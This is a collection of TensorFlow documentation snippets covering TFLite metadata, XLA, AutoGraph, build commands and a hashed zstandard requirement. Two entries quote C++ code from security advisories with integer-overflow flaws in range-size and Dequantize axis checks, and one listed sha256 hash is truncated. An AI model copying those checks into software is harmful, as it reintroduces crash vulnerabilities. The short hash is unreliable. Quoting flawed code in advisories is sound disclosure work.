# tensor is quantized to uint8. See the introduction for normalization and
# quantization parameters below for more details.
# https://www.tensorflow.org/lite/models/convert/metadata#normalization_and_quantization_parameters)
_INPUT_NORM_MEAN = 127.5
_INPUT_NORM_STD = 127.5

# Create the metadata writer.
writer = ImageSegmenterWriter.create_for_inference(
    writer_utils.load_file(_MODEL_PATH), [_INPUT_NORM_MEAN], [_INPUT_NORM_STD],
    [_LABEL_FILE])

# Verify the metadata generated by metadata writer.
print(writer.get_metadata_json())

# Populate the metadata into the model.
writer_utils.save_file(writer.populate(), _SAVE_TO_PATH)
```

----------------------------------------

TITLE: Download Object Detector Assets (Shell)
DESCRIPTION: These commands download an example TFLite object detection model (ssd_mobilenet_v1.tflite) and its corresponding label file (labelmap.txt). These assets are used to demonstrate adding metadata for an object detection model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_6

LANGUAGE: shell
CODE:
```
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/object_detector/ssd_mobilenet_v1.tflite -o ssd_mobilenet_v1.tflite
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/object_detector/labelmap.txt -o ssd_mobilenet_labels.txt
```

----------------------------------------

TITLE: Specifying Zstandard Dependency with Hashes (Python)
DESCRIPTION: This snippet specifies the 'zstandard' package at version 0.23.0. The following lines list SHA256 hashes for various distributions (like wheels or source tarballs) of this specific version. Tools like pip can use these hashes to verify the integrity and authenticity of the downloaded package before installation, preventing supply chain attacks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/requirements_updater/numpy1_requirements/requirements_lock_3_12.txt#_snippet_0

LANGUAGE: Python
CODE:
```
zstandard==0.23.0 \
    --hash=sha256:034b88913ecc1b097f528e42b539453fa82c3557e414b3de9d5632c80439a473 \
    --hash=sha256:0a7f0804bb3799414af278e9ad51be25edf67f78f916e08afdb983e74161b916 \
    --hash=sha256:11e3bf3c924853a2d5835b24f03eeba7fc9b07d8ca499e247e06ff5676461a15 \
    --hash=sha256:12a289832e520c6bd4dcaad68e944b86da3bad0d339ef7989fb7e88f92e96072 \
    --hash=sha256:1516c8c37d3a053b01c1c15b182f3b5f5eef19ced9b930b684a73bad121addf4 \
    --hash=sha256:157e89ceb4054029a289fb504c98c6a9fe8010f1680de0201b3eb5dc20aa6d9e \
    --hash=sha256:1bfe8de1da6d104f15a60d4a8a768288f66aa953bbe00d027398b93fb9680b26 \
    --hash=sha256:1e172f57cd78c20f13a3415cc8dfe24bf388614324d25539146594c16d78fcc8 \
    --hash=sha256:1fd7e0f1cfb70eb2f95a19b472ee7ad6d9a0a992ec0ae53286870c104ca939e5 \
    --hash=sha256:203d236f4c94cd8379d1ea61db2fce20730b4c38d7f1c34506a31b34edc87bdd \
    --hash=sha256:27d3ef2252d2e62476389ca8f9b0cf2bbafb082a3b6bfe9d90cbcbb5529ecf7c \
    --hash=sha256:29a2bc7c1b09b0af938b7a8343174b987ae021705acabcbae560166567f5a8db \
    --hash=sha256:2ef230a8fd217a2015bc91b74f6b3b7d6522ba48be29ad4ea0ca3a3775bf7dd5 \
    --hash=sha256:2ef3775758346d9ac6214123887d25c7061c92afe1f2b354f9388e9e4d48acfc \
    --hash=sha256:2f146f50723defec2975fb7e388ae3a024eb7151542d1599527ec2aa9cacb152 \
    --hash=sha256:2fb4535137de7e244c230e24f61721c86ebea04e1581d9d06ea1269 \
    --hash=sha256:32ba3b5ccde2d581b1e6aa952c836a6291e8435d788f656fe5976445865ae045 \
    --hash=sha256:34895a41273ad33347b2fc70e1bff4240556de3c46c6ea430a7ed91f9042aa4e \
    --hash=sha256:379b378ae694ba78cef921581ebd420c938936a153ded602c4fea612b7eaa90d \
    --hash=sha256:38302b78a850ff82656beaddeb0bb989a0322a8bbb1bf1ab10c17506681d772a \
    --hash=sha256:3aa014d55c3af933c1315eb4bb06dd0459661cc0b15cd61077afa6489bec63bb \
    --hash=sha256:4051e406288b8cdbb993798b9a45c59a4896b6ecee2f875424ec10276a895740 \
    --hash=sha256:40b33d93c6eddf02d2c19f5773196068d875c41ca25730e8288e9b672897c105 \
    --hash=sha256:43da0f0092281bf501f9c5f6f3b4c975a8a0ea82de49ba3f7100e64d422a1274 \
    --hash=sha256:445e4cb5048b04e90ce96a79b4b63140e3f4ab5f662321975679b5f6360b90e2 \
    --hash=sha256:48ef6a43b1846f6025dde6ed9fee0c24e1149c1c25f7fb0a0585572b2f3adc58 \
    --hash=sha256:50a80baba0285386f97ea36239855f6020ce452456605f262b2d33ac35c7770b \
    --hash=sha256:519fbf169dfac1222a76ba8861ef4ac7f0530c35dd79ba5727014613f91613d4 \
    --hash=sha256:53dd9d5e3d29f95acd5de6802e909ada8d8d8cfa37a3ac64836f3bc4bc5512db \
    --hash=sha256:53ea7cdc96c6eb56e76bb06894bcfb5dfa93b7adcf59d61c6b92674e24e2dd5e \
    --hash=sha256:576856e8594e6649aee06ddbfc738fec6a834f7c85bf7cadd1c53d4a58186ef9 \
    --hash=sha256:59556bf80a7094d0cfb9f5e50bb2db27fefb75d5138bb16fb052b61b0e0eeeb0 \
    --hash=sha256:5d41d5e025f1e0bccae4928981e71b2334c60f580bdc8345f824e7c0a4c2a813 \
    --hash=sha256:61062387ad820c654b6a6b5f0b94484fa19515e0c5116faf29f41a6bc91ded6e \
    --hash=sha256:61f89436cbfede4bc4e91b4397eaa3e2108ebe96d05e93d6ccc95ab5714be512 \
    --hash=sha256:62136da96a973bd2557f06ddd4e8e807f9e13cbb0bfb9cc06cfe6d98ea90dfe0 \
    --hash=sha256:64585e1dba664dc67c7cdabd56c1e5685233fbb1fc1966cfba2a340ec0dfff7b \
    --hash=sha256:65308f4b4890aa12d9b6ad9f2844b7ee42c7f7a4fd3390425b242ffc57498f48 \
    --hash=sha256:66b689c107857eceabf2cf3d3fc699c3c0fe8ccd18df2219d978c0283e4c508a \
    --hash=sha256:6a41c120c3dbc0d81a8e8adc73312d668cd34acd7725f036992b1b72d22c1772 \
    --hash=sha256:6f77fa49079891a4aab203d0b1744acc85577ed16d767b52fc089d83faf8d8ed \
    --hash=sha256:72c68dda124a1a138340fb62fa21b9bf4848437d9ca60bd35db36f2d3345f373 \
    --hash=sha256:752bf8a74412b9892f4e5b58f2f890a039f57037f52c89a740757ebd807f33ea \
    --hash=sha256:76e79bc28a65f467e0409098fa2c4376931fd3207fbeb6b956c7c476d53746dd \
    --hash=sha256:774d45b1fac1461f48698a9d4b5fa19a69d47ece02fa469825b442263f04021f \
    --hash=sha256:77da4c6bfa20dd5ea25cbf12c76f181a8e8cd7ea231c673828d0386b1740b8dc \
    --hash=sha256:77ea385f7dd5b5676d7fd943292ffa18fbf5c72ba98f7d09fc1fb9e819b34c23 \
    --hash=sha256:80080816b4f52a9d886e67f1f96912891074903238fe54f2de8b786f86baded2 \
    --hash=sha256:80a539906390591dd39ebb8d773771dc4db82ace6372c4d41e2d293f8e32b8db \
    --hash=sha256:82d17e94d735c99621bf8ebf9995f870a6b3e6d14543b99e201ae046dfe7de70 \
    --hash=sha256:837bb6764be6919963ef41235fd56a6486b132ea64afe5fafb4cb279ac44f259 \
    --hash=sha256:84433dddea68571a6d6bd4fbf8ff398236031149116a7fff6f777ff95cad3df9 \
    --hash=sha256:8c24f21fa2af4bb9f2c492a86fe0c34e6d2c63812a839590edaf177b7398f700 \
    --hash=sha256:8ed7d27cb56b3e058d3cf684d7200703bcae623e1dcc06ed1e18ecda39fee003 \
    --hash=sha256:9206649ec587e6b02bd124fb7799b86cddec350f6f6c14bc82a2b70183e708ba \
    --hash=sha256:983b6efd649723474f29ed42e1467f90a35a74793437d0bc64a5bf482bedfa0a \
    --hash=sha256:98da17ce9cbf3bfe4617e836d561e433f871129e3a7ac16d6ef4c680f13a839c \
    --hash=sha256:9c236e635582742fee16603042553d276cca506e824fa2e6489db04039521e90 \
    --hash=sha256:9da6bc32faac9a293ddfdcb9108d4b20416219461e4ec64dfea8383cac186690 \
    --hash=sha256:a05e6d6218461eb1b4771d973728f0133b2a4613a6779995df557f70794fd60f \
    --hash=sha256:a0817825b900fcd43ac5d05b8b3079937073d2b1ff9cf89427590718b70dd840 \
    --hash=sha256:a4ae99c57668ca1e78597d8b06d5af837f377f340f4cce993b551b2d7731778d \
    --hash=sha256:a8c86881813a78a6f4508ef9daf9d4995b8ac2d147dcb1a450448941398091c9 \
    --hash=sha256:a8fffdbd9d1408006baaf02f1068d7dd1f016c6bcb7538682622c556e7b68e35 \
    --hash=sha256:a9b07268d0c3ca5c170a385a0ab9fb7fdd9f5fd866be004c4ea39e44edce47dd \
    --hash=sha256:ab19a2d91963ed9e42b4e8d77cd847ae8381576585bad79dbd0a8837a9f6620a \
    --hash=sha256:ac184f87ff521f4840e6ea0b10c0ec90c6b1dcd0bad2f1e4a9a1b4fa177982ea \
    --hash=sha256:b0e166f698c5a3e914947388c162be2583e0c638a4703fc6a543e23a88dea3c1 \
    --hash=sha256:b2170c7e0367dde86a2647ed5b6f57394ea7f53545746104c6b09fc1f4223573 \
    --hash=sha256:b2d8c62d08e7255f68f7a740bae85b3c9b8e5466baa9cbf7f57f1cde0ac6bc09 \
    --hash=sha256:b4567955a6bc1b20e9c31612e615af6b53733491aeaa19a6b3b37f3b65477094 \
    --hash=sha256:b69bb4f51daf461b15e7b3db033160937d3ff88303a7bc808c67bbc1eaf98c78 \
    --hash=sha256:b8c0bd73aeac689beacd4e7667d48c299f61b959475cdbb91e7d3d88d27c56b9 \
    --hash=sha256:be9b5b8659dff1f913039c2feee1aca499cfbc19e98fa12bc85e037c17ec6ca5 \
    --hash=sha256:bf0a05b6059c0528477fba9054d09179beb63744355cab9f38059548fedd46a9 \
    --hash=sha256:c16842b846a8d2a145223f520b7e18b57c8f476924bda92aeee3a88d11cfc391 \
    --hash=sha256:c363b53e257246a954ebc7c488304b5592b9c53fbe74d03bc1c64dda153fb847 \
    --hash=sha256:c7c517d74bea1a6afd39aa612fa025e6b8011982a0897768a2f7c8ab4ebb78a2 \
    --hash=sha256:d20fd853fbb5807c8e84c136c278827b6167ded66c72ec6f9a14b863d809211c \
    --hash=sha256:d2240ddc86b74966c34554c49d00eaafa8200a18d3a5b6ffbf7da63b11d74ee2 \
    --hash=sha256:d477ed829077cd945b01fc3115edd132c47e6540ddcd96ca169facff28173057 \
    --hash=sha256:d50d31bfedd53a928fed6707b15a8dbeef011bb6366297cc435accc888b27c20 \
    --hash=sha256:dc1d33abb8a0d754ea4763bad944fd965d3d95b5baef6b121c0c9013eaf1907d
```

----------------------------------------

TITLE: Showing XLA Recompilation on Input Shape Changes Python
DESCRIPTION: Defines a simple addition function (`a + b`) marked for JIT compilation. The subsequent calls with tensors of different shapes demonstrate that XLA will recompile the function for each new shape encountered.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_3

LANGUAGE: Python
CODE:
```
@tf.function(jit_compile=True)
def recompiled_on_launch(a, b):
  return a + b

recompiled_on_launch(tf.ones([1, 10]), tf.ones([1, 10]))
recompiled_on_launch(tf.ones([1, 100]), tf.ones([1, 100]))
```

----------------------------------------

TITLE: Import Required Libraries Python
DESCRIPTION: Imports essential Python libraries including matplotlib for plotting, numpy for numerical operations, pandas for data analysis, and tensorflow/tensorflow_hub for model handling and TFLite conversion required for debugging.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_2

LANGUAGE: Python
CODE:
```
import matplotlib.pyplot as plt
import numpy as np
import pandas as pd
import tensorflow as tf
import tensorflow_datasets as tfds
import tensorflow_hub as hub
```

----------------------------------------

TITLE: Getting Name to Features Mapping in TensorFlow
DESCRIPTION: Returns a dictionary mapping feature names to their data types and shapes. This mapping is essential for parsing TFRecord files correctly, and its structure depends on whether the features are for training or evaluation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_7

LANGUAGE: python
CODE:
```
get_name_to_features(
    is_training
)

```

----------------------------------------

TITLE: Calculating Range Size in TensorFlow Math Ops (C++)
DESCRIPTION: This C++ snippet implements the RangeSize calculation within TensorFlow math operations. It determines the size of a range based on start, limit, and delta values, using Eigen for calculations. The code is presented as part of a security advisory because the calculation or subsequent conversion to int64_t could result in an integer overflow for large inputs, potentially causing a crash, as the included check is insufficient.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-141.md#_snippet_0

LANGUAGE: cpp
CODE:
```
  auto size = (std::is_integral<T>::value
                   ? ((Eigen::numext::abs(limit - start) +
                       Eigen::numext::abs(delta) - T(1)) /
                      Eigen::numext::abs(delta))
                   : (Eigen::numext::ceil(
                         Eigen::numext::abs((limit - start) / delta))));

  // This check does not cover all cases.
  if (size > std::numeric_limits<int64_t>::max()) {
    return errors::InvalidArgument("Requires ((limit - start) / delta) <= ",
                                   std::numeric_limits<int64_t>::max());
  }

  c->set_output(0, c->Vector(static_cast<int64_t>(size)));
  return OkStatus();
}
```

----------------------------------------

TITLE: Configuring XLA for CUDA Backend Inside Docker (Linux)
DESCRIPTION: Executes the XLA configuration script `./configure.py` inside the GPU Docker container, setting the build target backend to CUDA. This configures the build environment within the container for GPU support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_7

LANGUAGE: shell
CODE:
```
docker exec xla_gpu ./configure.py --backend=CUDA
```

----------------------------------------

TITLE: Dumping Compiled XLA Programs to Disk Shell
DESCRIPTION: Shell command combining `XLA_FLAGS` and `TF_XLA_FLAGS` to instruct XLA to dump generated programs (in HLO, LLVM IR, and PTX formats) to a specified directory. This is useful for inspecting the compiler's output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_9

LANGUAGE: Shell
CODE:
```
$ XLA_FLAGS="--xla_dump_to=/tmp/generated" TF_XLA_FLAGS="--tf_xla_auto_jit=2" my/tensorflow/program
```

----------------------------------------

TITLE: Loading Associated Files from Paths for Packing - Python
DESCRIPTION: This method loads associated files from specified file paths, preparing them to be concatenated after the TensorFlow Lite model file. It takes a list of file paths as input. An IOError is raised if any specified file is not found.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_7

LANGUAGE: Python
CODE:
```
load_associated_files(
    associated_files
)
```

----------------------------------------

TITLE: Converting Python Conditional Logic with AutoGraph Python
DESCRIPTION: Presents a simple Python function containing an `if/else` conditional statement and shows how `tf.autograph.to_graph` is used to convert it. AutoGraph translates such control flow into graph-compatible operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/intro.md#_snippet_3

LANGUAGE: Python
CODE:
```
def f(x):
  if x > 0:
    return x
  return -x

converted_f = tf.autograph.to_graph(f)
```

----------------------------------------

TITLE: Initializing TFLite Text Embedder Options (Python)
DESCRIPTION: This snippet shows the Python constructor signature for the `TextEmbedderOptions` class. It requires `base_options` of type `tflite_support.task.core.BaseOptions` for fundamental task setup and accepts optional `embedding_options` of type `tflite_support.task.processor.EmbeddingOptions` for specific embedding configurations, defaulting to a factory-provided instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextEmbedderOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.text.TextEmbedderOptions(
    base_options: <a href=\"../../../tflite_support/task/core/BaseOptions\"><code>tflite_support.task.core.BaseOptions</code></a>,
    embedding_options: <a href=\"../../../tflite_support/task/processor/EmbeddingOptions\"><code>tflite_support.task.processor.EmbeddingOptions</code></a> = dataclasses.field(default_factory=_EmbeddingOptions)
)
```

----------------------------------------

TITLE: Getting TFLite Index User Info Python
DESCRIPTION: Retrieves opaque user information stored within the associated ScaNN index file, if any exists. Returns the user info as a raw binary string or an empty string if no user info is present in the index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSearcher.md#_snippet_3

LANGUAGE: Python
CODE:
```
get_user_info() -> str
```

----------------------------------------

TITLE: Run TFLite Benchmark Activity via ADB Shell
DESCRIPTION: This command starts the BenchmarkModelActivity within the TFLite benchmark app on the Android device using 'adb shell am start'. It passes benchmark arguments, including the path to the graph file and the number of threads, as a single quoted string to the '--es args' extra.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_5

LANGUAGE: Shell
CODE:
```
adb shell am start -S \
  -n org.tensorflow.lite.benchmark/.BenchmarkModelActivity \
  --es args '"--graph=/data/local/tmp/mobilenet_quant_v1_224.tflite \
  --num_threads=4"'
```

----------------------------------------

TITLE: Getting Pre-Populated JSON Metadata (Python)
DESCRIPTION: This method retrieves the generated metadata as a JSON string. The returned string represents the metadata structure before it has been integrated or 'populated' into the TFLite model file. Consequently, it may not include fields automatically added during the population process, such as `min_parser_version`. The method returns a string containing the JSON data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_classifier/MetadataWriter.md#_snippet_4

LANGUAGE: python
CODE:
```
get_metadata_json() -> str
```

----------------------------------------

TITLE: Analyzing TFLite Model using tf.lite.experimental.Analyzer Python
DESCRIPTION: This snippet demonstrates how to convert a TensorFlow Keras model to the TFLite format and then use the `tf.lite.experimental.Analyzer.analyze` method to print a structural analysis of the TFLite flatbuffer model. It requires the `tensorflow` library installed. The analysis is printed to the console.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/Analyzer.md#_snippet_0

LANGUAGE: python
CODE:
```
model = tf.keras.applications.MobileNetV3Large()
fb_model = tf.lite.TFLiteConverterV2.from_keras_model(model).convert()
tf.lite.experimental.Analyzer.analyze(model_content=fb_model)
```

----------------------------------------

TITLE: Creating MetadataWriter from Metadata Info Objects (Python)
DESCRIPTION: Creates a MetadataWriter instance using simplified metadata information objects (GeneralMd, TensorMd). This method takes the raw model buffer, general model information, and lists of input/output tensor metadata information. It returns a MetadataWriter object. A ValueError is raised if the tensor names provided in the metadata information do not match the tensor names read from the model buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/metadata_writer/MetadataWriter.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata_info(
    model_buffer: bytearray,
    general_md: Optional[<a href="../../../../tflite_support/metadata_writers/metadata_info/GeneralMd"><code>tflite_support.metadata_writers.metadata_info.GeneralMd</code></a>] = None,
    input_md: Optional[List[Type[metadata_info.TensorMd]]] = None,
    output_md: Optional[List[Type[metadata_info.TensorMd]]] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: Checking TFLite Inference Output Shape - Python
DESCRIPTION: Demonstrates accessing and printing the shape of the main output tensor obtained from running inference on a TFLite model using the Python API. This is useful for understanding the structure and dimensions of the model's output tensor before further processing or visualization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_22

LANGUAGE: Python
CODE:
```
result['output'].shape
```

----------------------------------------

TITLE: Transforming Python Conditional Expression with AutoGraph
DESCRIPTION: Shows how a Python conditional expression (`true_val if cond else false_val`) is transformed into a call to the `ag__.if_expr` operator. Both the true and false value expressions are wrapped in lambda functions (thunks) to ensure functional form.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_1

LANGUAGE: Python
CODE:
```
true_val if cond else false_val
```

LANGUAGE: Python
CODE:
```
ag__.if_expr(cond, lambda: true_val, lambda: false_val, 'cond')
```

----------------------------------------

TITLE: Registering SimpleHashTableExport Op - TensorFlow C++
DESCRIPTION: Registers a TensorFlow custom operation named "Examples>SimpleHashTableExport". This op takes a resource handle as input and outputs two tensors: one containing all keys and one containing all values from the associated hash table resource. It requires `key_dtype` and `value_dtype` attributes which are used for the output tensor types. `SetShapeFn(ExportShapeFunction)` specifies the custom shape inference logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_7

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>SimpleHashTableExport")
    .Input("table_handle: resource")
    .Output("keys: key_dtype")
    .Output("values: value_dtype")
    .Attr("key_dtype: type")
    .Attr("value_dtype: type")
    .SetShapeFn(ExportShapeFunction);
```

----------------------------------------

TITLE: Setting Up Environment and Loading Data Python
DESCRIPTION: Performs initial environment setup by asserting GPU availability (common in Colab), clearing the Keras session, and initially disabling XLA JIT compilation. Defines and executes a function `load_data` that fetches the CIFAR-10 dataset using TFDS, normalizes image pixel values, and converts labels to one-hot encoding.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/autoclustering_xla.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
# Check that GPU is available: cf. https://colab.research.google.com/notebooks/gpu.ipynb
assert(tf.test.gpu_device_name())

tf.keras.backend.clear_session()
tf.config.optimizer.set_jit(False) # Start with XLA disabled.

def load_data():
  result = tfds.load('cifar10', batch_size = -1)
  (x_train, y_train) = result['train']['image'],result['train']['label']
  (x_test, y_test) = result['test']['image'],result['test']['label']
  
  x_train = x_train.numpy().astype('float32') / 256
  x_test = x_test.numpy().astype('float32') / 256

  # Convert class vectors to binary class matrices.
  y_train = tf.keras.utils.to_categorical(y_train, num_classes=10)
  y_test = tf.keras.utils.to_categorical(y_test, num_classes=10)
  return ((x_train, y_train), (x_test, y_test))

(x_train, y_train), (x_test, y_test) = load_data()
```

----------------------------------------

TITLE: Lowering ELU (MLIR/TOSA IR)
DESCRIPTION: Lowers an ELU (Exponential Linear Unit) operation to TOSA. It implements the function `elu(x) = x < 0 ? (exp(x) - 1) : x` using TOSA operations. This involves computing the exponential, subtracting one, comparing the input to zero, and selecting between the original input and the result of `exp(x) - 1` based on the comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_7

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_elu_op(Value %value)
{
    // elu(x) = x < 0 ? (exp(x) - 1) : x
    // Create constants for 0/1 and reshape to match the rank
    // of %value
    %one_const = tosa.CONST() {value={1}}
    %zero_const = tosa.CONST() {value={0}}

    vector bcast_shape
    for (int32 i = 0; i < %value.rank; i++) {
        bcast_shape.push_back(1)
    }

    %one_reshape = tosa.RESHAPE(%one_const) {new_shape=bcast_shape}
    %zero_reshape = tosa.RESHAPE(%zero_const) {new_shape=bcast_shape}

    %exp_in = tosa.EXP(%value)
    %sub = tosa.SUB(%exp_in, %one_reshape)
    %ge  = tosa.GREATER_EQUAL(%value, %zero_reshape)
    %output = tosa.SELECT(%ge, %value, %sub)
    return %output
}
```

----------------------------------------

TITLE: Parallel Bazel Build XLA ARM64 CPU Presubmit (Shell)
DESCRIPTION: Uses the `parallel` command to run a `bazel build` command in parallel for specific XLA ARM64 CPU presubmit targets. It includes tag filters excluding GPU and ARM-specific tests, uses warnings, RBE cross-compile, and non-CCL configurations, and configures output, profiling, and parallelism. It's set to build tests only but with `--nobuild`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_12

LANGUAGE: shell
CODE:
```
parallel --ungroup --retries 3 --delay 15 --nonall -- bazel build --build_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --test_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --config=warnings --config=rbe_cross_compile_linux_arm64 --config=nonccl --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --build_tests_only=False --nobuild -- //xla/tools/multihost_hlo_runner:hlo_runner_main //xla/tools:compute_xspace_stats_main
```

----------------------------------------

TITLE: Supporting Dynamic Lists with TensorArray and Experimental Features Python
DESCRIPTION: Illustrates how to handle dynamic lists in AutoGraph using `tf.TensorArray`, which is graph-compatible. It also shows how to enable experimental features like `Feature.LISTS` for more Python list-like semantics with TensorArrays.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/intro.md#_snippet_6

LANGUAGE: Python
CODE:
```
def f(n):
  l = tf.TensorArray(dtype=tf.int32, size=0, dynamic_size=True)
  for i in tf.range(n):
    l.append(i)
  return l

converted_f = tf.autograph.to_graph(f)
experimental_converted_f = tf.autograph.to_graph(
    f, experimental_optional_features=tf.autograph.experimental.Feature.LISTS)
```

----------------------------------------

TITLE: Calibrating TFLite Model for Debugging (Python)
DESCRIPTION: Converts a Keras model into a calibrated TensorFlow Lite model using the experimental `_experimental_calibrate_only` flag. This performs the calibration step (gathering tensor value ranges) but does not fully quantize the model, making it suitable input for subsequent MLIR-based quantization steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_25

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)
converter.representative_dataset = representative_dataset(ds)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter._experimental_calibrate_only = True
calibrated_model = converter.convert()
```

----------------------------------------

TITLE: Running TensorFlow Build Container with Mounts - Bash
DESCRIPTION: This command starts a Docker container named 'tf' in the background ('-d') using the specified TensorFlow build image. It sets the working directory inside the container, makes it interactive ('-it'), sets an environment variable for the Python version, and crucially, mounts local host directories into the container. These mounts are used to access the TensorFlow source code, save built packages, and utilize a local bazel cache, allowing work done inside the container to persist on the host machine.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
docker run --name tf -w /tf/tensorflow -it -d \
  --env TF_PYTHON_VERSION=3.9 \
  -v "/tmp/packages:/tf/pkg" \
  -v "/tmp/tensorflow:/tf/tensorflow" \
  -v "/tmp/bazelcache:/tf/cache" \
  tensorflow/build:latest-python3.9 \
  bash
```

----------------------------------------

TITLE: Handling Dequantize Axis and Checking Rank in TensorFlow C++
DESCRIPTION: This C++ snippet from TensorFlow's shape inference code for `Dequantize` shows how the `axis` attribute is retrieved and used. It checks if `axis` is less than -1 but fails to check an upper bound. The vulnerability occurs in the line `TF_RETURN_IF_ERROR(c->WithRankAtLeast(c->input(0), axis + 1, &input));` where a large positive `axis` value causes `axis + 1` to overflow the `int` type when checking the input tensor's rank.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-004.md#_snippet_1

LANGUAGE: C++
CODE:
```
  int axis = -1;
  Status s = c->GetAttr("axis", &axis);
  // ...
  if (axis < -1) {
    return errors::InvalidArgument("axis should be at least -1, got ",
                                   axis);
  }
  // ...
  if (axis != -1) {
    ShapeHandle input;
    TF_RETURN_IF_ERROR(c->WithRankAtLeast(c->input(0), axis + 1, &input));
    // ...
  }
```

----------------------------------------

TITLE: Loading TensorFlow SavedModel C++
DESCRIPTION: This snippet demonstrates the use of the `LoadSavedModel` function in C++ to load a SavedModel from a specified directory. It requires providing session options, run options, the export directory path, a set of tags to identify the desired graph, and a `SavedModelBundle` object to receive the loaded model's meta graph and session.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/README.md#_snippet_2

LANGUAGE: c++
CODE:
```
const string export_dir = ...
SavedModelBundle bundle;
...
LoadSavedModel(session_options, run_options, export_dir, {kSavedModelTagTrain},
               &bundle);
```

----------------------------------------

TITLE: Implementing Delegate Interface TensorFlow Lite C++
DESCRIPTION: Defines the capabilities of the custom TensorFlow Lite delegate. It specifies that the delegate supports only the built-in ADD and SUB operations and requires all input tensors to be of type float32. It also includes methods to initialize the delegate, get its name, and create an instance of its corresponding kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_0

LANGUAGE: C++
CODE:
```
// MyDelegate implements the interface of SimpleDelegateInterface.
// This holds the Delegate capabilities.
class MyDelegate : public SimpleDelegateInterface {
 public:
  bool IsNodeSupportedByDelegate(const TfLiteRegistration* registration,
                                 const TfLiteNode* node,
                                 TfLiteContext* context) const override {
    // Only supports Add and Sub ops.
    if (kTfLiteBuiltinAdd != registration->builtin_code &&
        kTfLiteBuiltinSub != registration->builtin_code)
      return false;
    // This delegate only supports float32 types.
    for (int i = 0; i < node->inputs->size; ++i) {
      auto& tensor = context->tensors[node->inputs->data[i]];
      if (tensor.type != kTfLiteFloat32) return false;
    }
    return true;
  }

  TfLiteStatus Initialize(TfLiteContext* context) override { return kTfLiteOk; }

  const char* Name() const override {
    static constexpr char kName[] = "MyDelegate";
    return kName;
  }

  std::unique_ptr<SimpleDelegateKernelInterface> CreateDelegateKernelInterface()
      override {
    return std::make_unique<MyDelegateKernel>();
  }
};
```

----------------------------------------

TITLE: Configuring Interpreter API Options Conditionally (Kotlin)
DESCRIPTION: This example shows how to use the result of the GPU availability check task (`useGpuTask`) to conditionally add the `GpuDelegateFactory` when creating `InterpreterApi.Options` for the Interpreter API.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_16
